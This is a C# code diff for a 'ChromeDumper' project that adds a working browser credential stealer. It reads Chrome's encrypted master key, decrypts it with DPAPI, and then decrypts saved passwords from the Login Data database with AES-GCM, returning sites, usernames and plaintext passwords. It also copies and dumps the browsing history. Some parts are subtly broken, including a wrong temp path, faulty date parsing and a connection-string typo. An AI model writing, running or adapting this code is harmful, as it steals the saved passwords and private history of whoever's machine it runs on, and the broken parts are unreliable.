@@ -7,20 +7,22 @@ using System.Threading.Tasks;
 
 using Newtonsoft.Json;
 using System.Security.Cryptography;
+using System.Data.SQLite;
+using Org.BouncyCastle.Crypto.Engines;
+using Org.BouncyCastle.Crypto.Modes;
+using Org.BouncyCastle.Crypto.Parameters;
+using System.Diagnostics;
+using System.Reflection;
 
 namespace ChromeDumper
 {
-    internal class clsDumper
+    public class clsChromeDumper
     {
         public string m_szChromeDirectory { get; set; }
         public string m_szLoginDataPath { get { return $"{m_szChromeDirectory}\\User Data\\Default\\Login Data"; } }
         public string m_szLocalState { get { return $"{m_szChromeDirectory}\\User Data\\Local State"; } }
 
-        public clsDumper(string szChromeDirectory)
-        {
-            m_szChromeDirectory = szChromeDirectory;
-        }
-        public clsDumper()
+        public clsChromeDumper()
         {
             string szAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
             m_szChromeDirectory = $"{szAppData}\\Google\\Chrome";
@@ -32,28 +34,213 @@ namespace ChromeDumper
             public string Username { get; set; }
             public string Password { get; set; }
             public DateTime CreationDate { get; set; }
-            public DateTime LastUsedDate {  get; set; }
+            public DateTime LastUsedDate { get; set; }
         }
 
-        private bool fnbIsV10(byte[] abData) => Encoding.UTF8.GetString(abData.Take(3).ToArray()) == "v10";
+        private bool fnbIsV10(byte[] data)
+        {
+            if (Encoding.UTF8.GetString(data.Take(3).ToArray()) == "v10")
+            {
+                return true;
+            }
+            else
+            {
+                return false;
+            }
+        }
 
         private byte[] fnabGetKey()
         {
-            string szContent = File.ReadAllText(m_szLocalState);
-            dynamic dyJson = JsonConvert.DeserializeObject(szContent);
-            string szKey = dyJson.os_crypt.encrypted_key;
-            byte[] abBinKey = Convert.FromBase64String(szKey).Skip(5).ToArray();
+            string localappdata = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
+            string FilePath = localappdata + "\\Google\\Chrome\\User Data\\Local State";
+            string content = File.ReadAllText(FilePath);
+            dynamic json = JsonConvert.DeserializeObject(content);
+            string key = json.os_crypt.encrypted_key;
+            byte[] binkey = Convert.FromBase64String(key).Skip(5).ToArray();
 
-            byte[] abDecryptedKey = ProtectedData.Unprotect(abBinKey, null, DataProtectionScope.CurrentUser);
+            byte[] decryptedkey = ProtectedData.Unprotect(binkey, null, DataProtectionScope.CurrentUser);
 
-            return abDecryptedKey;
+            return decryptedkey;
         }
 
-        public List<stCredential> fnDumpPassword()
+        //Initial action
+        private void fnPrepare(byte[] encryptedData, out byte[] nonce, out byte[] ciphertextTag)
         {
-            List<stCredential> lc = new List<stCredential>();
+            nonce = new byte[12];
+            ciphertextTag = new byte[encryptedData.Length - 3 - nonce.Length];
 
-            return lc;
+            System.Array.Copy(encryptedData, 3, nonce, 0, nonce.Length);
+            System.Array.Copy(encryptedData, 3 + nonce.Length, ciphertextTag, 0, ciphertextTag.Length);
+        }
+
+        private string fnszDecrypt(byte[] encryptedBytes, byte[] key, byte[] iv)
+        {
+            string sR = string.Empty;
+            try
+            {
+                GcmBlockCipher cipher = new GcmBlockCipher(new AesEngine());
+                AeadParameters parameters = new AeadParameters(new KeyParameter(key), 128, iv, null);
+
+                cipher.Init(false, parameters);
+                byte[] plainBytes = new byte[cipher.GetOutputSize(encryptedBytes.Length)];
+                Int32 retLen = cipher.ProcessBytes(encryptedBytes, 0, encryptedBytes.Length, plainBytes, 0);
+                cipher.DoFinal(plainBytes, retLen);
+
+                sR = Encoding.UTF8.GetString(plainBytes).TrimEnd("\r\n\0".ToCharArray());
+            }
+            catch
+            {
+                return "Decryption failed :(";
+            }
+
+            return sR;
+        }
+
+        //Start extract the user data
+        public List<stCredential> fnPasswordDumper()
+        {
+            string localappdata = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
+            string LoginDataPath = localappdata + "\\Google\\Chrome\\User Data\\Default\\Login Data";
+            string temp_path = Environment.SpecialFolder.Templates.ToString();
+            bool is_temp = false;
+            Process[] processlist = Process.GetProcessesByName("chrome");
+            if (processlist.Length != 0)
+            {
+                //If chrome browser is runnning, it is not able to connect Login Data file.
+                Console.WriteLine(LoginDataPath);
+                File.Copy(@LoginDataPath, temp_path + "\\ChromePassword.db");
+                LoginDataPath = temp_path + "\\ChromePassword.db";
+                is_temp = true;
+            }
+
+            byte[] key = fnabGetKey();
+
+            string connectionString = String.Format("Data Source={0};Version=3;", LoginDataPath);
+
+            SQLiteConnection conn = new SQLiteConnection(connectionString);
+            conn.Open();
+
+            List<stCredential> creds = new List<stCredential>();
+
+            SQLiteCommand cmd = new SQLiteCommand("select * from logins", conn);
+            //SQLiteCommand cmd = new SQLiteCommand("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins && order by date_last_used", conn);
+            SQLiteDataReader reader = cmd.ExecuteReader();
+
+            while (reader.Read())
+            {
+                byte[] encryptedData = (byte[])reader["password_value"];
+                if (fnbIsV10(encryptedData))
+                {
+                    byte[] nonce, ciphertextTag;
+                    fnPrepare(encryptedData, out nonce, out ciphertextTag);
+                    string password = fnszDecrypt(ciphertextTag, key, nonce);
+                    long date1 = long.Parse(reader["date_created"].ToString());
+                    long date2 = long.Parse(reader["date_last_used"].ToString());
+                    long date_created_convert;
+                    long date_last_login_convert;
+                    if (date1 != 86400000000) { date_created_convert = (date1 - 11644473600000000) / 1000000; } else { date_created_convert = date1; }
+                    if (date2 != 86400000000) { date_last_login_convert = (date2 - 11644473600000000) / 1000000; } else { date_last_login_convert = date2; }
+                    DateTime convert_date_1 = new DateTime(1970, 1, 1, 0, 0, 0, 0);
+                    DateTime convert_date_2 = new DateTime(1970, 1, 1, 0, 0, 0, 0);
+                    convert_date_1 = convert_date_1.AddSeconds(date_created_convert);
+                    convert_date_2 = convert_date_2.AddSeconds(date_last_login_convert);
+                    if (reader["username_value"].ToString() != "")
+                    {
+                        creds.Add(new stCredential
+                        {
+                            URL = reader["origin_url"].ToString(),
+                            Username = reader["username_value"].ToString(),
+                            Password = password,
+                            CreationDate = convert_date_1,
+                            LastUsedDate = convert_date_2
+                        }); ;
+                    }
+                }
+                else
+                {
+                    string password;
+                    try
+                    {
+                        password = Encoding.UTF8.GetString(ProtectedData.Unprotect(encryptedData, null, DataProtectionScope.CurrentUser));
+                    }
+                    catch
+                    {
+                        password = "Decryption failed :(";
+                    }
+                    long date1 = long.Parse(reader["date_created"].ToString());
+                    long date2 = long.Parse(reader["date_last_used"].ToString());
+                    long date_created_convert;
+                    long date_last_login_convert;
+                    DateTime epoch_start = new DateTime(1601, 1, 1);
+                    long delta1 = long.Parse(DateTime.Now.ToString()) - date1;
+                    long delta2 = long.Parse(DateTime.Now.ToString()) - date2;
+                    date_created_convert = long.Parse(epoch_start.ToString()) + delta1;
+                    date_last_login_convert = long.Parse(epoch_start.ToString()) + delta2;
+                    DateTime convert_date_1 = new DateTime(1970, 1, 1, 0, 0, 0, 0);
+                    DateTime convert_date_2 = new DateTime(1970, 1, 1, 0, 0, 0, 0);
+                    convert_date_1 = convert_date_1.AddSeconds(date_created_convert);
+                    convert_date_2 = convert_date_2.AddSeconds(date_last_login_convert);
+                    creds.Add(new stCredential
+                    {
+                        URL = reader["origin_url"].ToString(),
+                        Username = reader["username_value"].ToString(),
+                        Password = password,
+                        CreationDate = convert_date_1,
+                        LastUsedDate = convert_date_2
+                    });
+                }
+            }
+            if (is_temp)
+            {
+                File.Delete(temp_path);
+            }
+            return creds;
+        }
+    }
+
+    public class ChromeHistory
+    {
+        public class History
+        {
+            public string _url { get; set; }
+            public string _title { get; set; }
+            public DateTime visited_time { get; set; }
+        }
+
+        public static List<History> HistoryDumper()
+        {
+            List<History> user_history = new List<History>();
+            string google = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Google\Chrome\User Data\Default\History";
+            string fileName = DateTime.Now.Ticks.ToString();
+            string startup_path = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);
+            File.Copy(google, startup_path + "\\" + fileName);
+            using (SQLiteConnection con = new SQLiteConnection("DataSource = " + startup_path + "\\" + fileName + ";Versio=3;New=False;Compress=True;"))
+            {
+                con.Open();
+                //SQLiteDataAdapter da = new SQLiteDataAdapter("select url,title,visit_count,last_visit_time from urls order by last_visit_time desc", con);
+                SQLiteDataAdapter sql_adapter = new SQLiteDataAdapter("select * from urls order by last_visit_time desc", con);
+                DataSet data_set = new DataSet();
+                sql_adapter.Fill(data_set);
+                if (data_set != null && data_set.Tables.Count > 0 && data_set.Tables[0] != null)
+                {
+                    DataTable d_table = data_set.Tables[0];
+                    foreach (DataRow history_row in d_table.Rows)
+                    {
+                        long utc_microseconds = Convert.ToInt64(history_row["last_visit_time"]);
+                        DateTime gmt_time = DateTime.FromFileTimeUtc(10 * utc_microseconds);
+                        //DateTime local_time = TimeZoneInfo.ConvertTimeToUtc(gmt_time, TimeZoneInfo.Local);
+                        user_history.Add(new History()
+                        {
+                            _url = Convert.ToString(history_row["url"]),
+                            _title = Convert.ToString(history_row["title"]),
+                            //visited_time = local_time
+                            visited_time = DateTime.Now
+                        });
+                    }
+                }
+                con.Close();
+            }
+            return user_history;
         }
     }
 }
